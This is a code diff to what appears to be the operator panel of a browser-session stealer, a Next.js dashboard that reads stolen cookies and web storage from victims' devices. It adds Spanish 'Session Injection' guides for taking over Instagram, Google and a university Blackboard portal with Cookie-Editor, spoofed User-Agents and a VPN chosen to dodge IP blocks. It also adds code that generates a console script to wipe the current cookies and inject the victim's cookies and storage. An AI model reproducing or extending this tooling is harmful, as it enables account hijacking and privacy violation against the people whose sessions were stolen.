@@ -1,9 +1,7 @@
 ﻿"use client";
-export const runtime = 'edge';
 
 import React, { useEffect, useState } from "react";
 import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
-import GlassCard from "@/components/GlassCard";
 import { 
   Search, Clock, Globe, ExternalLink, 
   Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
@@ -13,6 +11,8 @@ import {
 import { motion, AnimatePresence } from "framer-motion";
 import Link from "next/link";
 import { useParams } from "next/navigation";
+
+export const runtime = 'edge';
 
 interface AccountInfo {
   platform: string;
@@ -33,15 +33,15 @@ const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], downl
       "PASO 4: Pégalo en la consola y presiona ENTER.",
       "PASO 5: La página se refrescará y entrarás automáticamente."
     ],
-    warning: "Solo funciona en PC de escritorio. No cierres la sesión en el celular original."
+    warning: "Solo funciona en PC. No cierres la sesión en el celular original."
   },
   "Instagram": {
     title: "Session Injection: Instagram",
     steps: [
       "PASO 1: Instala la extensión 'Cookie-Editor' en Chrome.",
-      "PASO 2: Copia el 'User-Agent' usando el botón 'COPY UA' de este panel.",
-      "PASO 3: Aplica ese User-Agent con un plugin como 'User-Agent Switcher'.",
-      "PASO 4: Usa 'EXPORT SESSION JSON' y pega el código en Cookie-Editor -> Import.",
+      "PASO 2: LIMPIEZA: Abre instagram.com y en Cookie-Editor haz clic en el ícono de basura (Delete All).",
+      "PASO 3: USER-AGENT: Copia el 'User-Agent' abajo y aplícalo con 'User-Agent Switcher'.",
+      "PASO 4: IMPORTAR: Usa 'EXPORT SESSION JSON', ve a Cookie-Editor -> Import y pega el código.",
       "PASO 5: Refresca instagram.com y listo."
     ],
     downloadLink: "https://chromewebstore.google.com/detail/cookie-editor/hlkenmcchncchcemhkaebachofncghba"
@@ -63,14 +63,16 @@ const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], downl
       "PASO 3: Entra a mail.google.com o drive.google.com.",
       "PASO 4: Si pide verificación, usa las cookies de YouTube/Facebook si están disponibles."
     ],
-    warning: "Usa una VPN similar a la del nodo para evitar bloqueos por seguridad."
+    warning: "Usa una VPN similar a la del nodo para evitar bloqueos por IP."
   },
   "Blackboard": {
     title: "Portal Académico: Blackboard",
     steps: [
-      "PASO 1: Entra a up.edu.pe o blackboard.com.",
-      "PASO 2: Importa el JSON de cookies.",
-      "PASO 3: Refresca la página; entrarás directo al portal académico."
+      "PASO 1: Entra a up.edu.pe o aulavirtual.up.edu.pe.",
+      "PASO 2: LIMPIEZA: Usa Cookie-Editor para BORRAR todas las cookies actuales antes de importar.",
+      "PASO 3: IMPORTAR: Usa 'EXPORT SESSION JSON' e impórtalo en Cookie-Editor.",
+      "PASO 4: USER-AGENT: Es vital aplicar el User-Agent original para no ser rechazado por el portal.",
+      "PASO 5: Refresca la página; entrarás directo al portal académico."
     ]
   },
   "TikTok": {
@@ -114,7 +116,7 @@ export default function DeviceControlCenter() {
     if (sData) {
       const sIds = sData.map(s => s.id);
       const { data: allC } = await supabase.from("cookies").select("snapshot_id, domain, name, value, expiration_date").in("snapshot_id", sIds);
-      const { data: allS } = await supabase.from("web_storage").select("snapshot_id, domain, storage_type").in("snapshot_id", sIds);
+      const { data: allS } = await supabase.from("web_storage").select("snapshot_id, domain, storage_type, key, value, db_name, store_name").in("snapshot_id", sIds);
       const newMap: Record<string, AccountInfo> = {};
       const ALLOWED = ["Instagram", "Facebook", "WhatsApp", "Blackboard", "Google", "TikTok"];
       sData.forEach(s => {
@@ -149,18 +151,52 @@ export default function DeviceControlCenter() {
   };
 
   const copyUA = () => { if (selectedSession) navigator.clipboard.writeText(selectedSession.user_agent || "").then(() => { setCopiedUA(true); setTimeout(()=>setCopiedUA(false), 3000); }); };
+  
   const copyJson = () => {
     if (!selectedSession) return;
     const t = accountMap[selectedSession.id]?.domain.toLowerCase() || "";
-    const f = cookies.filter(c => c.domain.toLowerCase().includes(t)).map(c => ({
-      domain: c.domain.startsWith('.') ? c.domain : '.' + c.domain,
-      expirationDate: Math.floor(Date.now() / 1000) + 86400 * 90,
-      hostOnly: !c.domain.startsWith("."), httpOnly: c.http_only, name: c.name, path: c.path || "/", sameSite: "no_restriction", secure: true, session: false, value: (c.value || "").replace(/^"|"$/g, "").replace(/\\([0-7]{3})/g, (m, o) => String.fromCharCode(parseInt(o, 8)))
-    }));
+    const filtered = cookies.filter(c => {
+      const d = c.domain.toLowerCase();
+      if (deviceSearch) return d.includes(deviceSearch.toLowerCase());
+      if (t.includes("instagram")) return d.includes("instagram.com") || d.includes("facebook.com");
+      return d.includes(t);
+    });
+    const f = filtered.map(c => {
+      const isHostOnly = !c.domain.startsWith(".");
+      return {
+        domain: isHostOnly ? c.domain.replace(/^\./, "") : (c.domain.startsWith('.') ? c.domain : "." + c.domain),
+        expirationDate: Math.floor(Date.now() / 1000) + 86400 * 90,
+        hostOnly: isHostOnly,
+        httpOnly: c.http_only,
+        name: c.name,
+        path: c.path || "/",
+        sameSite: "no_restriction",
+        secure: true,
+        session: false,
+        value: (c.value || "").replace(/^"|"$/g, "").replace(/\\([0-7]{3})/g, (m, o) => String.fromCharCode(parseInt(o, 8)))
+      };
+    });
     navigator.clipboard.writeText(JSON.stringify(f, null, 2)).then(() => { setCopiedJson(true); setTimeout(() => setCopiedJson(false), 5000); });
   };
+
   const copyConsole = () => {
-    const s = `(function(){const c=${JSON.stringify(cookies)};c.forEach(x=>{document.cookie=x.name+"="+x.value+";domain="+(x.domain.startsWith('.')?x.domain:'.'+x.domain)+";path=/;SameSite=Lax;Secure"});location.reload()})()`;
+    const ls = webStorage.filter(s => s.storage_type === 'localstorage');
+    const ss = webStorage.filter(s => s.storage_type === 'sessionstorage');
+    const s = `(function(){
+      const c=${JSON.stringify(cookies)};
+      const ls=${JSON.stringify(ls)};
+      const ss=${JSON.stringify(ss)};
+      console.log('Restaurando sesión completa...');
+      // Limpiar cookies
+      document.cookie.split(";").forEach(x=>{const n=x.split("=")[0].trim();document.cookie=n+"=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;domain="+location.hostname;document.cookie=n+"=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;domain=."+location.hostname});
+      // Inyectar Cookies
+      c.forEach(x=>{document.cookie=x.name+"="+x.value+";domain="+(x.domain.startsWith('.')?x.domain:'.'+x.domain)+";path="+(x.path||"/")+";SameSite=Lax;Secure"});
+      // Inyectar Storage
+      ls.forEach(x=>{try{localStorage.setItem(x.key,x.value)}catch(e){}});
+      ss.forEach(x=>{try{sessionStorage.setItem(x.key,x.value)}catch(e){}});
+      console.log('Completado. Recargando...');
+      setTimeout(()=>location.reload(),1000);
+    })()`;
     navigator.clipboard.writeText(s).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
   };
 
